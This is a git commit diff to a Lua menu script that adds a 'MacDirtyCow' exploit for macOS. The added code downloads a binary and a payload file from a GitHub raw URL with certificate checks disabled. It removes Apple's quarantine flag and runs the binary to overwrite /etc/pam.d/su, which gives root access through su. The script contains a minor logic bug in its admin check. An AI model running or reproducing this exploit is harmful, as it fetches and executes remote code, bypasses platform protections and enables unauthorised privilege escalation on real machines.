4363dd7dd941876a5358475ab36faec5d701673f
lincolnmuller <thyssenkrupp234@gmail.com>
2023-06-08 08:40:40 -0700

    add MDC exploit and lots of additions

--- fs.lua
+++ fs.lua
@@ -1,7 +1,7 @@
 #!/usr/bin/env lua
 
 -- pre-functions
-
+print("Defining preliminary functions")
 function os.capture(cmd, raw)
     local f = assert(io.popen(cmd, 'r'))
     local s = assert(f:read('*a'))
@@ -12,28 +12,37 @@ function os.capture(cmd, raw)
     s = string.gsub(s, '[\n\r]+', ' ')
     return s
   end
-  
-
--- variables // do not touch    
+function os.sleep(n)
+  local t = os.clock()
+  io.write("\n")
+  io.write("\27[A")
+  while os.clock() - t < n do end
+end
+print("Defining variables and running preperation functions")
+-- variables // do not touch
 local http = require("socket.http")
 local homedir = os.getenv("HOME")
-local tempdir = os.getenv("TMPDIR")
 local osVersion = os.capture("sw_vers -productVersion")
 local osBuildVer = os.capture("sw_vers -buildVersion")
 local scriptVersion = "v0.0.1"
 local date = os.date()
 local isAdmin = os.capture("id -u")
 isAdmin = tonumber(isAdmin) == 0 and "yes" or "no"
+if isAdmin then
+  print("\n\n>>If the script errors out here, make sure to run with sudo -E /path/to/script<<\n\n\n")
+end
+local tempdir = os.getenv("TMPDIR")
 if io.open(tempdir.."fs/", "r") then
   os.execute("rm -rf $TMPDIR/fs/")
 end
 os.execute("mkdir $TMPDIR/fs/")
 -- function table
+print("Creating function table")
 local functionTable = {
   e = function()
     io.write("\27c")
     print("Exiting script...")
-    os.execute("sleep 3")
+    os.sleep(3)
     io.write("\27c")
     os.exit()
   end,
@@ -51,18 +60,53 @@ local functionTable = {
   end,
   ["1"] = function()
     io.write("\27c")
+    print("Checking if macOS is exploitable...")
+    local incompatibleVersions = {
+      ["12.6.2"] = true,
+      ["12.6.3"] = true,
+      ["12.6.4"] = true,
+      ["12.6.5"] = true,
+      ["12.6.6"] = true,
+      ["13.1"] = true,
+      ["13.2"] = true,
+      ["13.2.1"] = true,
+      ["13.3"] = true,
+      ["13.3.1"] = true,
+      ["13.4"] = true,
+      ["13.5"] = true,
+    }
+    if incompatibleVersions[osVersion] then
+      print("\nYour macOS is NOT exploitable by MacDirtyCow, and therefore, this function is obsolete.")
+      print("\nYou may continue, but the exploit will not work.")
+      io.write("Press c and enter to continue, or any key and enter to exit: ")
+      local r = io.read()
+      if r ~= "c" then
+        welcomeScreen()
+      else
+      end
+    else
+      print("\nYour macOS is exploitable by MacDirtyCow, continuing...")
+    end
+    io.write("\27c")
     io.write("--> Download switcharoo")
+    os.sleep(2)
     os.execute("curl -k https://raw.githubusercontent.com/Thyssenkrupp234/ra1nm8/main/resources/exploit/switcharoo > "..tempdir.."fs/switcharoo 2>/dev/null")
+    io.write("\n--> Removing quarantine and making switcharoo executable")
+    os.execute("chmod +x "..tempdir.."fs/switcharoo && xattr -rd com.apple.quarantine "..tempdir.."fs/switcharoo")
+    os.sleep(1)
     io.write("\n--> Download overwrite_file.bin")
+    os.sleep(2)
     os.execute("curl -k https://raw.githubusercontent.com/Thyssenkrupp234/ra1nm8/main/resources/exploit/overwrite_file.bin > "..tempdir.."fs/overwrite_file.bin 2>/dev/null")
-    io.write("\nDownload items, executing command...\n\n")
+    io.write("\nDownloaded items, executing command...\n\n")
+    os.sleep(1)
     local exploitRun = os.capture(tempdir.."fs/switcharoo /etc/pam.d/su "..tempdir.."fs/overwrite_file.bin")
-    io.write("\nCompleted exploit. Press enter to return to main menu: ")
+    io.write("\27c")
+    io.write("Exploit ran. To check it it worked, run su in terminal.")
     io.read()
     welcomeScreen()
   end
 }
-
+print("Defining welcomescreen() function")
 function welcomeScreen()
   -- clear screen then print out welcome stuff
   io.write("\27c")
@@ -75,5 +119,5 @@ function welcomeScreen()
     welcomeScreen()
   end
 end
-
+print("Starting welcomescreen() function")
 welcomeScreen()
